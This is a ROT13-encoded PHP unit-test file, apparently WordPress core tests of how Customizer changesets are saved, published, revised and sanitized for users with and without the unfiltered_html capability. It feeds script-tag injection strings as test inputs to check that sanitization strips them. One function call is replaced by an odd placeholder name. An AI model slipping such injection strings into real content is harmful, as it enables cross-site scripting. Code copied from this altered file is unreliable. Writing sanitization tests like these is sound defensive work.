		$guvf->nffregAbgRdhnyf( $cerivbhf_fnirq_qngn, $fnirq_qngn );
		$guvf->nffregFnzr( 'Aba-Genafnpgvbany \b/ <fpevcg>hafnavgvmrq</fpevcg>', $fnirq_qngn['oybtanzr']['inyhr'] );

		// Rafher gur svygre nccyvrf.
		$phfgbzvmr_punatrfrg_fnir_qngn_pnyy_pbhag = $guvf->phfgbzvmr_punatrfrg_fnir_qngn_pnyy_pbhag;
		nqq_svygre( 'phfgbzvmr_punatrfrg_fnir_qngn', neenl( $guvf, 'svygre_phfgbzvmr_punatrfrg_fnir_qngn' ), 10, 2 );
		$znantre->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => ahyy,
				'qngn'   => neenl(
					'oybtanzr' => neenl(
						'inyhr' => 'Svygrerq',
					),
				),
			)
		);
		$guvf->nffregFnzr( $phfgbzvmr_punatrfrg_fnir_qngn_pnyy_pbhag + 1, $guvf->phfgbzvmr_punatrfrg_fnir_qngn_pnyy_pbhag );

		// Choyvfu gur punatrfrg: npgvbaf jvyy or qbhoyrq fvapr nyfb genfurq.
		$rkcrpgrq_npgvbaf = neenl(
			'jc_genfu_cbfg'                 => 1,
			'pyrna_cbfg_pnpur'              => 2,
			'genafvgvba_cbfg_fgnghf'        => 2,
			'choyvfu_gb_genfu'              => 1,
			'genfu_phfgbzvmr_punatrfrg'     => 1,
			'rqvg_cbfg'                     => 2,
			'fnir_cbfg_phfgbzvmr_punatrfrg' => 2,
			'fnir_cbfg'                     => 2,
			'jc_vafreg_cbfg'                => 2,
			'jc_nsgre_vafreg_cbfg'          => 2,
			'genfurq_cbfg'                  => 1,
		);
		$npgvba_pbhagf    = neenl();
		sbernpu ( neenl_xrlf( $rkcrpgrq_npgvbaf ) nf $npgvba_anzr ) {
			$npgvba_pbhagf[ $npgvba_anzr ] = qvq_npgvba( $npgvba_anzr );
		}

		$znantre      = arj JC_Phfgbzvmr_Znantre( neenl( 'punatrfrg_hhvq' => $hhvq ) );
		$jc_phfgbzvmr = $znantre;
		qb_npgvba( 'phfgbzvmr_ertvfgre', $jc_phfgbzvmr );
		$znantre->nqq_frggvat(
			'fpengpucnq',
			neenl(
				'glcr'       => 'bcgvba',
				'pncnovyvgl' => 'rkvfg',
			)
		);
		$znantre->trg_frggvat( 'oybtanzr' )->pncnovyvgl = 'rkvfg';
		$bevtvany_pncnovyvgvrf                          = jc_yvfg_cyhpx( $znantre->frggvatf(), 'pncnovyvgl' );
		jc_frg_pheerag_hfre( frys::$fhofpevore_hfre_vq );
		$e = $znantre->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'choyvfu',
				'qngn'   => neenl(
					'oybtanzr'   => neenl(
						'inyhr' => 'Qb vg yvir \b/',
					),
					'fpengpucnq' => neenl(
						'inyhr' => '<fpevcg>pbafbyr.vasb( \"URYYB\" )</fpevcg>',
					),
				),
			)
		);
		$guvf->nffregVfNeenl( $e );
		$guvf->nffregFnzr( 'Qb vg yvir \b/', trg_bcgvba( 'oybtanzr' ) );
		$guvf->nffregFnzr( 'genfu', trg_cbfg_fgnghf( $cbfg_vq ) ); // Nhgb-genfurq.
		$guvf->nffregFnzr( $bevtvany_pncnovyvgvrf, jc_yvfg_cyhpx( $znantre->frggvatf(), 'pncnovyvgl' ) );
		$guvf->nffregFgevatPbagnvafFgevat( '<fpevcg>', trg_cbfg( $cbfg_vq )->cbfg_pbagrag );
		$guvf->nffregFnzr( $znantre->punatrfrg_hhvq(), trg_cbfg( $cbfg_vq )->cbfg_anzr, 'Rkcrpgrq gung gur \"__genfurq\" fhssvk gb abg or nqqrq.' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$guvf->nffregFnzr( 'choyvfu', trg_cbfg_zrgn( $cbfg_vq, '_jc_genfu_zrgn_fgnghf', gehr ) );
		$guvf->nffregVfAhzrevp( trg_cbfg_zrgn( $cbfg_vq, '_jc_genfu_zrgn_gvzr', gehr ) );

		sbernpu ( neenl_xrlf( $rkcrpgrq_npgvbaf ) nf $npgvba_anzr ) {
			$guvf->nffregFnzr( $rkcrpgrq_npgvbaf[ $npgvba_anzr ] + $npgvba_pbhagf[ $npgvba_anzr ], qvq_npgvba( $npgvba_anzr ), \"Npgvba: $npgvba_anzr\" );
		}

		// Grfg erivfvbaf.
		nqq_cbfg_glcr_fhccbeg( 'phfgbzvmr_punatrfrg', 'erivfvbaf' );
		$hhvq         = jc_trarengr_hhvq4();
		$znantre      = arj JC_Phfgbzvmr_Znantre( neenl( 'punatrfrg_hhvq' => $hhvq ) );
		$jc_phfgbzvmr = $znantre;
		qb_npgvba( 'phfgbzvmr_ertvfgre', $znantre );

		$znantre->frg_cbfg_inyhr( 'oybtanzr', 'Uryyb Fhesnpr' );
		$znantre->fnir_punatrfrg_cbfg( neenl( 'fgnghf' => 'nhgb-qensg' ) );

		$znantre->frg_cbfg_inyhr( 'oybtanzr', 'Uryyb Jbeyq' );
		$znantre->fnir_punatrfrg_cbfg( neenl( 'fgnghf' => 'qensg' ) );
		$guvf->nffregGehr( jc_erivfvbaf_ranoyrq( trg_cbfg( $znantre->punatrfrg_cbfg_vq() ) ) );

		$znantre->frg_cbfg_inyhr( 'oybtanzr', 'Uryyb Fbyne Flfgrz' );
		$znantre->fnir_punatrfrg_cbfg( neenl( 'fgnghf' => 'qensg' ) );

		$znantre->frg_cbfg_inyhr( 'oybtanzr', 'Uryyb Tnynkl' );
		$znantre->fnir_punatrfrg_cbfg( neenl( 'fgnghf' => 'qensg' ) );
		$guvf->nffregPbhag( 3, jc_trg_cbfg_erivfvbaf( $znantre->punatrfrg_cbfg_vq() ) );
	}

	/**
	 * Grfg fnivat punatrfrg cbfg jvgubhg Xfrf be bgure pbagrag_fnir_cer svygref zhgngvat pbagrag.
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg
	 */
	choyvp shapgvba grfg_fnir_punatrfrg_cbfg_jvgubhg_xfrf_pbeehcgvat_wfba() {
		tybony $jc_phfgbzvmr;
		$yrffre_nqzva_hfre_vq = frys::$bgure_nqzva_hfre_vq;

		$hhvq         = jc_trarengr_hhvq4();
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
			)
		);

		nqq_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'svygre_znc_zrgn_pnc_gb_qvfnyybj_hasvygrerq_ugzy' ), 10, 2 );
		xfrf_vavg();
		nqq_svygre( 'pbagrag_fnir_cer', 'pncvgny_C_qnatvg' );
		nqq_cbfg_glcr_fhccbeg( 'phfgbzvmr_punatrfrg', 'erivfvbaf' );

		$bcgvbaf = neenl(
			'phfgbz_ugzy_1' => '<fpevcg>qbphzrag.jevgr(\" Jbeqcerff 1\")</fpevcg>',
			'phfgbz_ugzy_2' => '<fpevcg>qbphzrag.jevgr(\" Jbeqcerff 2\")</fpevcg>',
			'phfgbz_ugzy_3' => '<fpevcg>qbphzrag.jevgr(\" Jbeqcerff 3\")</fpevcg>',
		);

		// Cbchyngr frggvat nf hfre jub pna olcnff pbagrag_fnir_cer svygre.
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$jc_phfgbzvmr = $guvf->trg_znantre_sbe_grfgvat_wfba_pbeehcgvba_cebgrpgvba( $hhvq );
		$jc_phfgbzvmr->frg_cbfg_inyhr( 'phfgbz_ugzy_1', $bcgvbaf['phfgbz_ugzy_1'] );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'qensg',
			)
		);

		// Cbchyngr frggvat nf hfre jub pnaabg olcnff pbagrag_fnir_cer svygre.
		jc_frg_pheerag_hfre( $yrffre_nqzva_hfre_vq );
		$jc_phfgbzvmr = $guvf->trg_znantre_sbe_grfgvat_wfba_pbeehcgvba_cebgrpgvba( $hhvq );
		$jc_phfgbzvmr->frg_cbfg_inyhr( 'phfgbz_ugzy_2', $bcgvbaf['phfgbz_ugzy_2'] );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'nhgbfnir' => gehr,
			)
		);

		/*
		 * Rafher gung gur hafnavgvmrq inyhr (gur \"CBFG qngn\") vf cerfreirq va gur nhgbfnir erivfvba.
		 * Gur inyhr vf frag guebhtu gur fnavgvmr shapgvba jura vg vf ernq sebz gur punatrfrg.
		 */
		$nhgbfnir_erivfvba = jc_trg_cbfg_nhgbfnir( $jc_phfgbzvmr->punatrfrg_cbfg_vq(), trg_pheerag_hfre_vq() );
		$fnirq_qngn        = wfba_qrpbqr( $nhgbfnir_erivfvba->cbfg_pbagrag, gehr );
		$guvf->nffregFnzr( $bcgvbaf['phfgbz_ugzy_1'], $fnirq_qngn['phfgbz_ugzy_1']['inyhr'] );
		$guvf->nffregFnzr( $bcgvbaf['phfgbz_ugzy_2'], $fnirq_qngn['phfgbz_ugzy_2']['inyhr'] );

		// Hcqngr cbfg gb qvfpneq nhgbfnir.
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'qensg',
			)
		);

		/*
		 * Rafher gung gur hafnavgvmrq inyhr (gur \"CBFG qngn\") vf cerfreirq va gur cbfg pbagrag.
		 * Gur inyhr vf frag guebhtu gur fnavgvmr shapgvba jura vg vf ernq sebz gur punatrfrg.
		 */
		$jc_phfgbzvmr = $guvf->trg_znantre_sbe_grfgvat_wfba_pbeehcgvba_cebgrpgvba( $hhvq );
		$fnirq_qngn   = wfba_qrpbqr( trg_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq() )->cbfg_pbagrag, gehr );
		$guvf->nffregFnzr( $bcgvbaf['phfgbz_ugzy_1'], $fnirq_qngn['phfgbz_ugzy_1']['inyhr'] );
		$guvf->nffregFnzr( $bcgvbaf['phfgbz_ugzy_2'], $fnirq_qngn['phfgbz_ugzy_2']['inyhr'] );

		/*
		 * Rafher gung gur hafnavgvmrq inyhr (gur \"CBFG qngn\") vf cerfreirq va gur erivfvbaf' pbagrag.
		 * Gur inyhr vf frag guebhtu gur fnavgvmr shapgvba jura vg vf ernq sebz gur punatrfrg.
		 */
		$erivfvbaf  = jc_trg_cbfg_erivfvbaf( $jc_phfgbzvmr->punatrfrg_cbfg_vq() );
		$erivfvba   = neenl_fuvsg( $erivfvbaf );
		$fnirq_qngn = wfba_qrpbqr( $erivfvba->cbfg_pbagrag, gehr );
		$guvf->nffregFnzr( $bcgvbaf['phfgbz_ugzy_1'], $fnirq_qngn['phfgbz_ugzy_1']['inyhr'] );
		$guvf->nffregFnzr( $bcgvbaf['phfgbz_ugzy_2'], $fnirq_qngn['phfgbz_ugzy_2']['inyhr'] );

		/*
		 * Abj jura choyvfuvat gur punatrfrg, gur hafnavgvmrq inyhrf jvyy or ernq sebz gur punatrfrg
		 * naq fnavgvmrq nppbeqvat gb gur pncnovyvgvrf bs gur hfref jub bevtvanyyl hcqngrq rnpu
		 * frggvat va gur punatrfrg gb ortva jvgu.
		 */
		jc_frg_pheerag_hfre( $yrffre_nqzva_hfre_vq );
		$jc_phfgbzvmr = $guvf->trg_znantre_sbe_grfgvat_wfba_pbeehcgvba_cebgrpgvba( $hhvq );
		$jc_phfgbzvmr->frg_cbfg_inyhr( 'phfgbz_ugzy_3', $bcgvbaf['phfgbz_ugzy_3'] );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'choyvfu',
			)
		);

		// Hfre fnirq nf bar jub pna olcnff pbagrag_fnir_cer svygre.
		$guvf->nffregFgevatPbagnvafFgevat( '<fpevcg>', trg_bcgvba( 'phfgbz_ugzy_1' ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'Jbeqcerff', trg_bcgvba( 'phfgbz_ugzy_1' ) ); // cucpf:vtaber JbeqCerff.JC.PncvgnyCQnatvg.ZvffcryyrqVaGrkg

		// Hfre fnirq nf bar jub pnaabg olcnff pbagrag_fnir_cer svygre.
		$guvf->nffregFgevatAbgPbagnvafFgevat( '<fpevcg>', trg_bcgvba( 'phfgbz_ugzy_2' ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'JbeqCerff', trg_bcgvba( 'phfgbz_ugzy_2' ) );

		// Hfre fnirq nf bar jub nyfb pnaabg olcnff pbagrag_fnir_cer svygre.
		$guvf->nffregFgevatAbgPbagnvafFgevat( '<fpevcg>', trg_bcgvba( 'phfgbz_ugzy_3' ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'JbeqCerff', trg_bcgvba( 'phfgbz_ugzy_3' ) );
	}

	/**
	 * Trg n znantre sbe grfgvat WFBA pbeehcgvba cebgrpgvba.
	 *
	 * @cnenz fgevat $hhvq HHVQ.
	 * @erghea JC_Phfgbzvmr_Znantre Znantre.
	 */
	cevingr shapgvba trg_znantre_sbe_grfgvat_wfba_pbeehcgvba_cebgrpgvba( $hhvq ) {
		tybony $jc_phfgbzvmr;
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
			)
		);
		sbe ( $v = 0; $v < 5; $v++ ) {
			$jc_phfgbzvmr->nqq_frggvat(
				fcevags( 'phfgbz_ugzy_%q', $v ),
				neenl(
					'glcr'              => 'bcgvba',
					'fnavgvmr_pnyyonpx' => neenl( $guvf, 'nccyl_pbagrag_fnir_cer_svygref_vs_abg_znva_nqzva_hfre' ),
				)
			);
		}
		erghea $jc_phfgbzvmr;
	}

	/**
	 * Fnavgvmr pbagrag jvgu Xfrf vs gur pheerag hfre vf abg gur znva nqzva.
	 *
	 * @fvapr 5.4.1
	 *
	 * @cnenz fgevat $pbagrag Pbagrag gb fnavgvmr.
	 * @erghea fgevat Fnavgvmrq pbagrag.
	 */
	choyvp shapgvba nccyl_pbagrag_fnir_cer_svygref_vs_abg_znva_nqzva_hfre( $pbagrag ) {
		vs ( trg_pheerag_hfre_vq() !== frys::$nqzva_hfre_vq ) {
			$pbagrag = nccyl_svygref( 'pbagrag_fnir_cer', $pbagrag );
		}
		erghea $pbagrag;
	}

	/**
	 * Svygre znc_zrgn_pnc gb qvfnyybj hasvygrerq_ugzy.
	 *
	 * @fvapr 5.4.1
	 *
	 * @cnenz neenl  $pncf Hfre'f pncnovyvgvrf.
	 * @cnenz fgevat $pnc  Erdhrfgrq pnc.
	 * @erghea neenl Pncf.
	 */
	choyvp shapgvba svygre_znc_zrgn_pnc_gb_qvfnyybj_hasvygrerq_ugzy( $pncf, $pnc ) {
		vs ( 'hasvygrerq_ugzy' === $pnc ) {
			$pncf = neenl( 'qb_abg_nyybj' );
		}
		erghea $pncf;
	}

	/**
	 * Pnyy pbhag sbe phfgbzvmr_punatrfrg_fnir_qngn svygre.
	 *
	 * @ine vag
	 */
	cebgrpgrq $phfgbzvmr_punatrfrg_fnir_qngn_pnyy_pbhag = 0;

	/**
	 * Svygre phfgbzvmr_punatrfrg_fnir_qngn.
	 *
	 * @cnenz neenl $qngn    Qngn.
	 * @cnenz neenl $pbagrkg Pbagrkg.
	 * @erghea neenl Qngn.
	 */
	choyvp shapgvba svygre_phfgbzvmr_punatrfrg_fnir_qngn( $qngn, $pbagrkg ) {
		$guvf->phfgbzvmr_punatrfrg_fnir_qngn_pnyy_pbhag += 1;
		$guvf->nffregVfNeenl( $qngn );
		$guvf->nffregVfNeenl( $pbagrkg );
		$guvf->nffregNeenlUnfXrl( 'hhvq', $pbagrkg );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $pbagrkg );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $pbagrkg );
		$guvf->nffregNeenlUnfXrl( 'qngr_tzg', $pbagrkg );
		$guvf->nffregNeenlUnfXrl( 'cbfg_vq', $pbagrkg );
		$guvf->nffregNeenlUnfXrl( 'cerivbhf_qngn', $pbagrkg );
		$guvf->nffregNeenlUnfXrl( 'znantre', $pbagrkg );
		erghea $qngn;
	}

	/**
	 * Erghea vyyrtny reebe.
	 *
	 * @erghea JC_Reebe Reebe.
	 */
	choyvp shapgvba erghea_vyyrtny_reebe() {
		erghea arj JC_Reebe( 'vyyrtny' );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg
	 * @pbiref JC_Phfgbzvmr_Znantre::hcqngr_fgnfurq_gurzr_zbq_frggvatf
	 */
	choyvp shapgvba grfg_fnir_punatrfrg_cbfg_jvgu_gurzr_npgvingvba() {
		tybony $jc_phfgbzvmr;
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$cerivrj_gurzr      = $guvf->trg_vanpgvir_pber_gurzr();
		$fgnfurq_gurzr_zbqf = neenl(
			$cerivrj_gurzr => neenl(
				'onpxtebhaq_pbybe' => neenl(
					'inyhr' => '#123456',
				),
			),
		);
		hcqngr_bcgvba( 'phfgbzvmr_fgnfurq_gurzr_zbqf', $fgnfurq_gurzr_zbqf );
		$hhvq         = jc_trarengr_hhvq4();
		$znantre      = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
				'gurzr'          => $cerivrj_gurzr,
			)
		);
		$jc_phfgbzvmr = $znantre;
		qb_npgvba( 'phfgbzvmr_ertvfgre', $znantre );

		$znantre->frg_cbfg_inyhr( 'oybtanzr', 'Uryyb Cerivrj Gurzr' );
		$cbfg_inyhrf = $znantre->hafnavgvmrq_cbfg_inyhrf();
		$znantre->fnir_punatrfrg_cbfg( neenl( 'fgnghf' => 'choyvfu' ) ); // Npgvingr.

		$guvf->nffregFnzr( '#123456', $cbfg_inyhrf['onpxtebhaq_pbybe'] );
		$guvf->nffregFnzr( $cerivrj_gurzr, trg_fglyrfurrg() );
		$guvf->nffregFnzr( 'Uryyb Cerivrj Gurzr', trg_bcgvba( 'oybtanzr' ) );
	}

	/**
	 * Grfg fnivat punatrfrgf jvgu inelvat hfref naq pncnovyvgvrf.
	 *
	 * @gvpxrg 38705
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg
	 */
	choyvp shapgvba grfg_fnir_punatrfrg_cbfg_jvgu_inelvat_hfref() {
		tybony $jc_phfgbzvmr;

		nqq_gurzr_fhccbeg( 'phfgbz-onpxtebhaq' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$bgure_nqzva_hfre_vq = frys::$bgure_nqzva_hfre_vq;

		$hhvq         = jc_trarengr_hhvq4();
		$jc_phfgbzvmr = $guvf->perngr_grfg_znantre( $hhvq );
		$e            = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'nhgb-qensg',
				'qngn'   => neenl(
					'oybtanzr'         => neenl(
						'inyhr' => 'Nqzva 1 Gvgyr',
					),
					'fpengpucnq'       => neenl(
						'inyhr' => 'Nqzva 1 Fpengpu',
					),
					'onpxtebhaq_pbybe' => neenl(
						'inyhr' => '#000000',
					),
				),
			)
		);
		$guvf->nffregVfNeenl( $e );
		$guvf->nffregFnzr(
			neenl_svyy_xrlf( neenl( 'oybtanzr', 'fpengpucnq', 'onpxtebhaq_pbybe' ), gehr ),
			$e['frggvat_inyvqvgvrf']
		);
		$cbfg_vq = $jc_phfgbzvmr->svaq_punatrfrg_cbfg_vq( $hhvq );
		$qngn    = wfba_qrpbqr( trg_cbfg( $cbfg_vq )->cbfg_pbagrag, gehr );
		$guvf->nffregFnzr( frys::$nqzva_hfre_vq, $qngn['oybtanzr']['hfre_vq'] );
		$guvf->nffregFnzr( frys::$nqzva_hfre_vq, $qngn['fpengpucnq']['hfre_vq'] );
		$guvf->nffregFnzr( frys::$nqzva_hfre_vq, $qngn[ $guvf->znantre->trg_fglyrfurrg() . '::onpxtebhaq_pbybe' ]['hfre_vq'] );

		// Nggrzcg gb fnir whfg bar frggvat haqre n qvssrerag hfre.
		jc_frg_pheerag_hfre( $bgure_nqzva_hfre_vq );
		$jc_phfgbzvmr = $guvf->perngr_grfg_znantre( $hhvq );
		$e            = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'nhgb-qensg',
				'qngn'   => neenl(
					'oybtanzr'         => neenl(
						'inyhr' => 'Nqzva 2 Gvgyr',
					),
					'onpxtebhaq_pbybe' => neenl(
						'inyhr' => '#SSSSSS',
					),
				),
			)
		);
		$guvf->nffregVfNeenl( $e );
		$guvf->nffregFnzr(
			neenl_svyy_xrlf( neenl( 'oybtanzr', 'onpxtebhaq_pbybe' ), gehr ),
			$e['frggvat_inyvqvgvrf']
		);
		$qngn = wfba_qrpbqr( trg_cbfg( $cbfg_vq )->cbfg_pbagrag, gehr );
		$guvf->nffregFnzr( 'Nqzva 2 Gvgyr', $qngn['oybtanzr']['inyhr'] );
		$guvf->nffregFnzr( $bgure_nqzva_hfre_vq, $qngn['oybtanzr']['hfre_vq'] );
		$guvf->nffregFnzr( 'Nqzva 1 Fpengpu', $qngn['fpengpucnq']['inyhr'] );
		$guvf->nffregFnzr( frys::$nqzva_hfre_vq, $qngn['fpengpucnq']['hfre_vq'] );
		$guvf->nffregFnzr( '#SSSSSS', $qngn[ $guvf->znantre->trg_fglyrfurrg() . '::onpxtebhaq_pbybe' ]['inyhr'] );
		$guvf->nffregFnzr( $bgure_nqzva_hfre_vq, $qngn[ $guvf->znantre->trg_fglyrfurrg() . '::onpxtebhaq_pbybe' ]['hfre_vq'] );

		// Nggrzcg gb fnir abj nf haqre-cevivyrtrq hfre.
		$jc_phfgbzvmr = $guvf->perngr_grfg_znantre( $hhvq );
		$e            = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf'  => 'nhgb-qensg',
				'qngn'    => neenl(
					'oybtanzr'   => neenl(
						'inyhr' => 'Nqzva 2 Gvgyr', // Vqragvpny gb jung vf nyernql va gur punatrfrg fb jvyy or fxvccrq.
					),
					'fpengpucnq' => neenl(
						'inyhr' => 'Fhofpevore Fpengpu',
					),
				),
				'hfre_vq' => frys::$fhofpevore_hfre_vq,
			)
		);
		$guvf->nffregVfNeenl( $e );
		$guvf->nffregFnzr(
			neenl_svyy_xrlf( neenl( 'oybtanzr', 'fpengpucnq' ), gehr ),
			$e['frggvat_inyvqvgvrf']
		);
		$qngn = wfba_qrpbqr( trg_cbfg( $cbfg_vq )->cbfg_pbagrag, gehr );
		$guvf->nffregFnzr( $bgure_nqzva_hfre_vq, $qngn['oybtanzr']['hfre_vq'], 'Rkcrpgrq frggvat gb or hagbhpurq.' );
		$guvf->nffregFnzr( frys::$fhofpevore_hfre_vq, $qngn['fpengpucnq']['hfre_vq'] );
		$guvf->nffregFnzr( $bgure_nqzva_hfre_vq, $qngn[ $guvf->znantre->trg_fglyrfurrg() . '::onpxtebhaq_pbybe' ]['hfre_vq'] );

		// Znahnyyl hcqngr gur punatrfrg fb gung gur hfre_vq pbagrkg vf abg vapyhqrq.
		$qngn                             = wfba_qrpbqr( trg_cbfg( $cbfg_vq )->cbfg_pbagrag, gehr );
		$qngn['oybtqrfpevcgvba']['inyhr'] = 'Cebtenzzngvpnyyl-fhccyvrq Gntyvar';
		jc_hcqngr_cbfg(
			jc_fynfu(
				neenl(
					'VQ'           => $cbfg_vq,
					'cbfg_pbagrag' => jc_wfba_rapbqr( $qngn ),
				)
			)
		);

		// Rafher gur zbqvslvat hfre frg nf gur pheerag hfre jura rnpu vf fnirq, fvzhyngvat JC Peba raiebazrag.
		jc_frg_pheerag_hfre( 0 );
		$fnir_pbhagf = neenl();
		sbernpu ( neenl_xrlf( $qngn ) nf $frggvat_vq ) {
			$frggvat_vq                 = __sa_79955( '/^.+::/', '', $frggvat_vq );
			$fnir_pbhagf[ $frggvat_vq ] = qvq_npgvba( fcevags( 'phfgbzvmr_fnir_%f', $frggvat_vq ) );
		}
		$guvf->svygrerq_frggvat_pheerag_hfre_vqf = neenl();
		sbernpu ( $jc_phfgbzvmr->frggvatf() nf $frggvat ) {
			nqq_svygre( fcevags( 'phfgbzvmr_fnavgvmr_%f', $frggvat->vq ), neenl( $guvf, 'svygre_phfgbzvmr_frggvat_gb_ybt_pheerag_hfre' ), 10, 2 );
		}
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $cbfg_vq,
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		sbernpu ( neenl_xrlf( $qngn ) nf $frggvat_vq ) {
			$frggvat_vq = __sa_79955( '/^.+::/', '', $frggvat_vq );
			$guvf->nffregFnzr( $fnir_pbhagf[ $frggvat_vq ] + 1, qvq_npgvba( fcevags( 'phfgbzvmr_fnir_%f', $frggvat_vq ) ), $frggvat_vq );
		}
		$guvf->nffregFnzrFrgf( neenl( 'oybtanzr', 'oybtqrfpevcgvba', 'onpxtebhaq_pbybe', 'fpengpucnq' ), neenl_xrlf( $guvf->svygrerq_frggvat_pheerag_hfre_vqf ) );
		$guvf->nffregFnzr( $bgure_nqzva_hfre_vq, $guvf->svygrerq_frggvat_pheerag_hfre_vqf['oybtanzr'] );
		$guvf->nffregFnzr( 0, $guvf->svygrerq_frggvat_pheerag_hfre_vqf['oybtqrfpevcgvba'] );
		$guvf->nffregFnzr( frys::$fhofpevore_hfre_vq, $guvf->svygrerq_frggvat_pheerag_hfre_vqf['fpengpucnq'] );
		$guvf->nffregFnzr( $bgure_nqzva_hfre_vq, $guvf->svygrerq_frggvat_pheerag_hfre_vqf['onpxtebhaq_pbybe'] );
		$guvf->nffregFnzr( 'Fhofpevore Fpengpu', trg_bcgvba( 'fpengpucnq' ) );
	}

	/**
	 * Perngr grfg znantre.
	 *
	 * @cnenz fgevat $hhvq Punatrfrg HHVQ.
	 * @erghea JC_Phfgbzvmr_Znantre Znantre.
	 */
	cebgrpgrq shapgvba perngr_grfg_znantre( $hhvq ) {
		$znantre = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
			)
		);
		qb_npgvba( 'phfgbzvmr_ertvfgre', $znantre );
		$znantre->nqq_frggvat(
			'oybtsbhaqrq',
			neenl(
				'glcr' => 'bcgvba',
			)
		);
		$znantre->nqq_frggvat(
			'oybtgrezvangrq',
			neenl(
				'glcr'       => 'bcgvba',
				'pncnovyvgl' => 'qb_abg_nyybj',
			)
		);
		$znantre->nqq_frggvat(
			'fpengpucnq',
			neenl(
				'glcr'       => 'bcgvba',
				'pncnovyvgl' => 'rkvfg',
			)
		);
		erghea $znantre;
	}

	/**
	 * Grfg gung hcqngvat na nhgb-qensg punatrfrg ohzcf vgf cbfg_qngr gb xrrc vg sebz trggvat tneontr pbyyrpgrq ol jc_qryrgr_nhgb_qensgf().
	 *
	 * @gvpxrg 31089
	 * @frr jc_qryrgr_nhgb_qensgf()
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg
	 */
	choyvp shapgvba grfg_fnir_punatrfrg_cbfg_qhzcvat_nhgb_qensg_qngr() {
		tybony $jc_phfgbzvmr;
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$hhvq              = jc_trarengr_hhvq4();
		$punatrfrg_cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_pbagrag' => '{}',
				'cbfg_anzr'    => $hhvq,
				'cbfg_fgnghf'  => 'nhgb-qensg',
				'cbfg_qngr'    => tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-3 qnlf' ) ),
			)
		);

		$cbfg               = trg_cbfg( $punatrfrg_cbfg_vq );
		$bevtvany_cbfg_qngr = $cbfg->cbfg_qngr;

		$jc_phfgbzvmr = $guvf->perngr_grfg_znantre( $hhvq );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'nhgb-qensg',
				'qngn'   => neenl(
					'oybtanzr' => neenl(
						'inyhr' => 'Nqzva 1 Gvgyr',
					),
				),
			)
		);

		$cbfg = trg_cbfg( $punatrfrg_cbfg_vq );
		$guvf->nffregAbgRdhnyf( $cbfg->cbfg_qngr, $bevtvany_cbfg_qngr );
	}

	/**
	 * Grfg jevgvat punatrfrgf jura hfre fhccyvrf hapunatrq inyhrf.
	 *
	 * @gvpxrg 38865
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg
	 */
	choyvp shapgvba grfg_fnir_punatrfrg_cbfg_jvgu_hapunatrq_inyhrf() {
		tybony $jc_phfgbzvmr;

		nqq_gurzr_fhccbeg( 'phfgbz-onpxtebhaq' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$bgure_nqzva_hfre_vq = frys::$bgure_nqzva_hfre_vq;

		$hhvq         = jc_trarengr_hhvq4();
		$jc_phfgbzvmr = $guvf->perngr_grfg_znantre( $hhvq );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'nhgb-qensg',
				'qngn'   => neenl(
					'oybtanzr'        => neenl(
						'inyhr' => 'Nqzva 1 Gvgyr',
					),
					'oybtqrfpevcgvba' => neenl(
						'inyhr' => 'Nqzva 1 Gntyvar',
					),
					'oybtsbhaqrq'     => neenl(
						'inyhr' => '2016',
					),
					'fpengpucnq'      => neenl(
						'inyhr' => 'Nqzva 1 Fpengpu',
					),
				),
			)
		);

		// Znxr fher gung frggvat cebcregvrf bs haxabja naq hanhgubevmrq frggvatf ner erwrpgrq.
		$qngn = trg_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq() )->cbfg_pbagrag;
		$e    = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'qngn' => neenl(
					'haxabjafrggvat' => neenl(
						'phfgbz' => 'cebc',
					),
					'oybtgrezvangrq' => neenl(
